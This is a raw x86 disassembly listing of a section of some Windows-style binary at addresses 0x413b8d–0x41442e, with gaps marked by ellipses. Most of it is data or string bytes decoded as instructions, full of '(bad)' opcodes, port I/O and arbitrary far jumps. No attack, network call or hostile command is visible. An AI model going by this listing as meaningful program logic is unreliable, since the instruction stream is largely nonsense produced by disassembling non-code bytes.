  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x37]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    DWORD PTR [ebx+0x0],eax
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x12],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	mov    cs,WORD PTR [esi-0x2e2378f1]
  413f06:	add    BYTE PTR [eax],al
  413f08:	add    al,0x1
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	inc    ecx
  413f0d:	jae    0x413f5d
  413f0f:	push   0xbb814d82
  413f14:	fs fwait
  413f16:	aaa    
  413f17:	xchg   edi,eax
  413f18:	mov    cl,0xd3
  413f1a:	in     al,0xa4
  413f1c:	inc    ebp
  413f1d:	jae    0x413ece
  413f1f:	dec    eax
  413f20:	lea    eax,[eax+edx*8]
  413f23:	sbb    BYTE PTR [edi+0x4a],0xdc
  413f27:	xor    eax,0x56436d4e
  413f2c:	sub    DWORD PTR [eax+0xfd5164f],0x94f3df29
  413f36:	jne    0x413f0e
  413f38:	mov    edx,0x8ca27e6a
  413f3d:	mov    ecx,0x1f78fa78
  413f42:	ret    
  413f43:	aad    0xc2
  413f45:	cli    
  413f46:	jne    0x413ece
  413f48:	popf   
  413f49:	adc    ebp,DWORD PTR [ebx]
  413f4b:	xchg   edi,eax
  413f4c:	adc    DWORD PTR [edx-0x48],edx
  413f4f:	jmp    0x304:0xb8b2b243
  413f56:	scas   al,BYTE PTR es:[edi]
  413f57:	(bad)  
  413f58:	xchg   edi,eax
  413f59:	idiv   ch
  413f5b:	std    
  413f5c:	push   ss
  413f5d:	or     eax,0xdcadbcd3
  413f62:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f63:	stc    
  413f64:	mov    ds:0x8c4711c7,al
  413f69:	(bad)  
  413f6a:	cmp    BYTE PTR [ecx+0x10],bh
  413f6d:	je     0x413efc
  413f6f:	ins    BYTE PTR es:[edi],dx
  413f70:	rcr    DWORD PTR [edx+0x63],cl
  413f73:	sub    al,BYTE PTR [edi-0x2a]
  413f76:	push   esp
  413f77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f78:	scas   al,BYTE PTR es:[edi]
  413f79:	push   ebx
  413f7a:	xchg   edx,eax
  413f7b:	ins    BYTE PTR es:[edi],dx
  413f7c:	mov    edi,0xe5c35151
  413f81:	xor    bh,BYTE PTR [ebx]
  413f83:	mov    cl,0x98
  413f85:	push   edx
  413f86:	adc    eax,0x498d0b8
  413f8b:	sub    al,BYTE PTR [edi]
  413f8d:	add    DWORD PTR [edx+0x1c80e9b7],ebp
  413f93:	cmp    dl,BYTE PTR [ebx+ebx*2+0x20]
  413f97:	dec    ebp
  413f98:	popf   
  413f99:	or     ecx,DWORD PTR [ebx-0x1c0be0ca]
  413f9f:	adc    DWORD PTR [ebx],edx
  413fa1:	stos   BYTE PTR es:[edi],al
  413fa2:	dec    edi
  413fa3:	cmp    dl,dl
  413fa5:	adc    al,0x48
  413fa7:	xchg   edx,eax
  413fa8:	pop    ecx
  413fa9:	scas   al,BYTE PTR es:[edi]
  413faa:	fwait
  413fab:	or     BYTE PTR [edx-0x37b59b91],0xc9
  413fb2:	or     ecx,esi
  413fb4:	mov    ebx,0x7dbcad96
  413fb9:	xchg   ebx,eax
  413fba:	icebp  
  413fbb:	in     eax,dx
  413fbc:	lea    esi,fs:[ebx+eax*4+0x25972c66]
  413fc4:	sbb    al,0xc1
  413fc6:	sub    eax,0xd1a997d
  413fcb:	pop    ss
  413fcc:	or     ebx,eax
  413fce:	or     DWORD PTR [ecx],ebx
  413fd0:	add    ebx,DWORD PTR [edx+0x75a626e7]
  413fd6:	push   eax
  413fd7:	test   DWORD PTR [edx+0x39fc761e],eax
  413fdd:	dec    eax
  413fde:	dec    edx
  413fdf:	cmp    BYTE PTR [esi+0x57],bh
  413fe2:	into   
  413fe3:	popf   
  413fe4:	or     al,0x8c
  413fe6:	mov    cl,cl
  413fe8:	pop    ecx
  413fe9:	pop    ebp
  413fea:	rcl    BYTE PTR [eax],cl
  413fec:	sbb    ebp,esp
  413fee:	test   al,0xcf
  413ff0:	push   ebx
  413ff1:	(bad)  
  413ff2:	xor    esi,DWORD PTR [ebp+0xcab1eb0]
  413ff8:	push   0x6dd7ee9e
  413ffd:	data16 sti 
  413fff:	xbegin 0x1640a08b
  414005:	cmp    bh,BYTE PTR [ecx+eax*8-0x31434922]
  41400c:	call   0x0:0xde7414
	...
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0xc299:0xe7d52e96
  414083:	call   0x421368
  414088:	add    al,0x1
  41408a:	add    BYTE PTR [eax],al
  41408c:	mov    ebp,0xf33cf2fa
  414091:	icebp  
  414092:	xchg   esi,eax
  414093:	push   ds
  414094:	jnp    0x414104
  414096:	aaa    
  414097:	push   ebp
  414098:	not    BYTE PTR [ecx+0x7c]
  41409b:	imul   edi,ecx,0x9a4d5f59
  4140a1:	push   esi
  4140a2:	add    eax,0x6528e65d
  4140a7:	add    BYTE PTR [esi],dh
  4140a9:	add    edi,edx
  4140ab:	and    BYTE PTR [ebp+0x77],ch
  4140ae:	dec    eax
  4140af:	js     0x414123
  4140b1:	iret   
  4140b2:	shr    eax,1
  4140b4:	out    0x4a,al
  4140b6:	sbb    ch,ah
  4140b8:	inc    ebx
  4140b9:	push   eax
  4140ba:	vmwrite esi,DWORD PTR [esi]
  4140bd:	bound  ecx,QWORD PTR [edi]
  4140bf:	and    esi,eax
  4140c1:	cld    
  4140c2:	neg    BYTE PTR [esi-0x77]
  4140c5:	dec    edx
  4140c6:	les    esi,FWORD PTR ds:0xcdcb9107
  4140cc:	and    BYTE PTR [ebp+0x42],cl
  4140cf:	in     eax,dx
  4140d0:	jb     0x41409a
  4140d2:	mov    BYTE PTR [ebx],ch
  4140d4:	pop    ebx
  4140d5:	pusha  
  4140d6:	clc    
  4140d7:	mov    ds:0xefed3a6e,al
  4140dc:	mov    al,0x83
  4140de:	in     eax,dx
  4140df:	sahf   
  4140e0:	jb     0x41415e
  4140e2:	and    esp,esp
  4140e4:	dec    edi
  4140e5:	scas   al,BYTE PTR es:[edi]
  4140e6:	jns    0x414083
  4140e8:	mov    cl,0xcb
  4140ea:	stc    
  4140eb:	retf   
  4140ec:	rcl    ebx,0x82
  4140ef:	adc    BYTE PTR [ecx+0x42748b01],ch
  4140f5:	xlat   BYTE PTR ds:[ebx]
  4140f6:	cdq    
  4140f7:	cmp    dl,BYTE PTR [ebp-0x672318e5]
  4140fd:	sti    
  4140fe:	outs   dx,BYTE PTR ds:[esi]
  4140ff:	xchg   esi,eax
  414100:	scas   eax,DWORD PTR es:[edi]
  414101:	loope  0x4140b8
  414103:	xchg   ebx,eax
  414104:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414106:	cdq    
  414107:	ret    
  414108:	cwde   
  414109:	jecxz  0x414162
  41410b:	inc    eax
  41410c:	pop    esp
  41410d:	adc    al,0x21
  41410f:	lods   al,BYTE PTR ds:[esi]
  414110:	fisttp WORD PTR [edi-0x3a]
  414113:	leave  
  414114:	add    BYTE PTR [eax+0x6cf7bd51],cl
  41411a:	jns    0x41413d
  41411c:	push   ss
  41411d:	pop    ds
  41411e:	shrd   DWORD PTR [eax+0x51],ecx,cl
  414122:	push   ebx
  414123:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414124:	sbb    DWORD PTR [ebx-0x3a],0xec600b2a
  41412b:	rol    DWORD PTR [ebx-0x735f99ca],1
  414131:	in     al,dx
  414132:	loope  0x4140de
  414134:	xchg   ecx,eax
  414135:	cmp    ecx,ebx
  414137:	pop    esp
  414138:	xchg   ebx,eax
  414139:	js     0x4140e6
  41413b:	fidiv  DWORD PTR [ebx+0x20]
  41413e:	popf   
  41413f:	sti    
  414140:	std    
  414141:	dec    ebx
  414142:	inc    esi
  414143:	cmp    DWORD PTR [ebx+edi*8+0x7bc96f13],edx
  41414a:	jmp    0x7c28:0x124ae358
  414151:	out    0x16,eax
  414153:	es mov eax,0x5c05783
  414159:	or     edx,DWORD PTR [esp+eax*2-0x7fdbeac9]
  414160:	mov    esp,0x85f5e40d
  414165:	dec    edx
  414166:	loopne 0x4141d0
  414168:	js     0x4140fc
  41416a:	jnp    0x414116
  41416c:	push   esp
  41416d:	xchg   ecx,eax
  41416e:	xor    BYTE PTR [edi],bl
  414170:	xchg   edi,eax
  414171:	xor    ebp,ebp
  414173:	xchg   eax,ebp
  414175:	mov    dh,0xb5
  414177:	ins    DWORD PTR es:[edi],dx
  414178:	ror    BYTE PTR [ebp+esi*1+0xa],cl
  41417c:	not    DWORD PTR [eax-0x2376679]
  414182:	jmp    0x7b89c6f0
  414187:	cld    
  414188:	pop    ds
  414189:	push   eax
  41418a:	stos   DWORD PTR es:[edi],eax
  41418b:	or     ebx,DWORD PTR [edi-0x40]
  41418e:	inc    edx
  41418f:	cmp    DWORD PTR [eax],eax
	...
  4141f1:	add    BYTE PTR [eax],al
  4141f3:	add    BYTE PTR [edx],al
  4141f5:	adc    al,BYTE PTR [ecx]
  4141f7:	mov    ds:0xb3a2b311,eax
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	ss pop edi
  414202:	fist   WORD PTR [ebp-0x1c]
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR [ecx+eax*1],al
  41420a:	add    BYTE PTR [eax],al
  41420c:	mov    BYTE PTR [esi+eiz*2+0x1],bh
  414210:	and    dh,bl
  414212:	ret    
  414213:	cmp    eax,0xec92f8aa
  414218:	call   0x43c5:0xbf67725a
  41421f:	in     eax,dx
  414220:	push   ebp
  414221:	push   edx
  414222:	push   ds
  414223:	sbb    dl,BYTE PTR es:[edi]
  414226:	inc    edx
  414227:	fild   DWORD PTR [esi+0x22]
  41422a:	cmp    dh,BYTE PTR [eax]
  41422c:	sbb    ch,BYTE PTR [edx+0x63561170]
  414232:	cdq    
  414233:	fld    QWORD PTR [ebx+0x28c1e671]
  414239:	mov    WORD PTR [ebp+0x18830338],ds
  41423f:	cmp    al,0xbb
  414241:	retf   0x12f4
  414244:	adc    ch,BYTE PTR [ebp-0x40d5ec86]
  41424a:	dec    ecx
  41424b:	clc    
  41424c:	out    dx,eax
  41424d:	jl     0x4142b0
  41424f:	pop    ss
  414250:	bnd ret 
  414252:	and    bh,dl
  414254:	adc    al,0x79
  414256:	clc    
  414257:	adc    ecx,DWORD PTR [ebx]
  414259:	fild   WORD PTR [ebp-0x66224ccf]
  41425f:	stos   BYTE PTR es:[edi],al
  414260:	aad    0x68
  414262:	out    dx,al
  414263:	add    al,0x52
  414265:	retf   
  414266:	inc    edx
  414267:	mov    ebx,0x1a11903c
  41426c:	in     eax,0xeb
  41426e:	mov    ebx,0x5ba05bfb
  414273:	add    edx,DWORD PTR [ecx]
  414275:	mov    al,ds:0x5b0eab45
  41427a:	pop    edx
  41427b:	loope  0x414234
  41427d:	into   
  41427e:	cmp    ah,BYTE PTR [esi-0x1b1e1f5e]
  414284:	aad    0x0
  414286:	push   esp
  414287:	adc    eax,0x524e164e
  41428c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41428d:	cmp    ecx,esp
  41428f:	pop    esp
  414290:	dec    ecx
  414291:	dec    edx
  414292:	xchg   DWORD PTR [ebx+0x1a317a11],ebp
  414298:	test   DWORD PTR [eax-0x723385f1],0x501aa131
  4142a2:	retf   
  4142a3:	lea    ebp,[esi+edx*4+0x744f41d3]
  4142aa:	std    
  4142ab:	pop    edx
  4142ac:	in     eax,dx
  4142ad:	cmp    ah,BYTE PTR [edx-0x62712973]
  4142b3:	mov    cl,0xf4
  4142b5:	mov    edi,0xa34100f0
  4142ba:	mov    edx,0xb3380e50
  4142bf:	mov    al,0xfd
  4142c1:	popf   
  4142c2:	push   esi
  4142c3:	xchg   ecx,eax
  4142c4:	imul   esp
  4142c6:	in     eax,0xaa
  4142c8:	gs pop es
  4142ca:	or     DWORD PTR [esi-0x3357dbd8],esp
  4142d0:	xchg   ebx,eax
  4142d1:	sbb    DWORD PTR [edx+ebp*8],edi
  4142d4:	xchg   ecx,eax
  4142d5:	(bad)  
  4142d6:	int3   
  4142d7:	jmp    0x41434e
  4142d9:	pushf  
  4142da:	jecxz  0x41427d
  4142dc:	mov    ds:0x5c727f59,al
  4142e1:	dec    ebx
  4142e2:	and    DWORD PTR ds:0xa9a5cf4d,edi
  4142e8:	adc    ebp,DWORD PTR [ebx+edx*4]
  4142eb:	lods   eax,DWORD PTR ds:[esi]
  4142ec:	pop    edx
  4142ed:	loope  0x414324
  4142ef:	imul   edx,DWORD PTR [edx+0xd28c424],0x83aa5a72
  4142f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4142fa:	jb     0x4142fb
  4142fc:	or     eax,0xd278fe93
  414301:	mov    cl,ah
  414303:	cdq    
  414304:	push   eax
  414305:	mov    edi,DWORD PTR [edx+edi*1]
  414308:	xchg   edx,eax
  414309:	(bad)  
  41430a:	mov    ah,0x46
  41430c:	push   edi
  41430d:	(bad)  
  41430e:	xor    eax,0x1f
	...
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	or     al,0xfe
  414382:	sub    al,0xd5
  414384:	call   0x441445d
  414389:	add    DWORD PTR [eax],eax
  41438b:	add    bl,cl
  41438d:	push   esp
  41438e:	or     BYTE PTR [esi],cl
  414390:	fld    QWORD PTR ds:0xf2cb0d93
  414396:	cmp    al,0x38
  414398:	push   esp
  414399:	lea    ecx,[edi]
  41439b:	test   BYTE PTR [edi],ah
  41439d:	std    
  41439e:	ja     0x414409
  4143a0:	xchg   DWORD PTR [ebp+0x3a],ecx
  4143a3:	inc    edi
  4143a4:	mov    eax,ds:0xbdb22e39
  4143a9:	cmp    al,0xff
  4143ab:	test   BYTE PTR [eax-0x145439c4],ch
  4143b1:	retf   0xf188
  4143b4:	or     BYTE PTR [edi-0x17fadc53],ch
  4143ba:	rcr    DWORD PTR ds:0xcba6eae0,1
  4143c0:	ins    BYTE PTR es:[edi],dx
  4143c1:	lods   al,BYTE PTR ds:[esi]
  4143c2:	jmp    0x3c21cc76
  4143c7:	push   ebp
  4143c8:	test   bl,bh
  4143ca:	jae    0x414398
  4143cc:	and    esp,DWORD PTR [esi-0xb3326fe]
  4143d2:	lock xor esp,DWORD PTR [edx]
  4143d5:	mov    ebp,0xa8901338
  4143da:	sbb    BYTE PTR [esi-0x2],cl
  4143dd:	arpl   WORD PTR [eax+esi*4],si
  4143e0:	call   0xb589d2a5
  4143e5:	mov    WORD PTR [edi+ecx*2-0x5ae82ef5],es
  4143ec:	mov    edx,0x6d2aeda9
  4143f1:	jl     0x4143c0
  4143f3:	test   BYTE PTR ds:0xe33575e6,ch
  4143f9:	xchg   DWORD PTR [ebx],eax
  4143fb:	push   eax
  4143fc:	xchg   ebx,eax
  4143fd:	pop    esi
  4143fe:	es push ebx
  414400:	lea    ebp,[edx]
  414402:	sbb    esp,ecx
  414404:	xchg   ecx,eax
  414405:	adc    al,0x1b
  414407:	mov    bh,0x96
  414409:	popf   
  41440a:	enter  0x3c39,0x29
  41440e:	out    0x30,eax
  414410:	and    BYTE PTR [ecx+0x20],cl
  414413:	mov    WORD PTR [eax-0xb416085],fs
  414419:	push   edi
  41441a:	cli    
  41441b:	pop    ebp
  41441c:	xor    dl,dh
  41441e:	cmp    DWORD PTR [esp-0xad19841],ecx
  414425:	out    0x1b,al
  414427:	mov    dh,0x81
  414429:	idiv   DWORD PTR [ecx]
  41442b:	push   esp
  41442c:	sbb    dl,dh
  41442e:	(bad)  
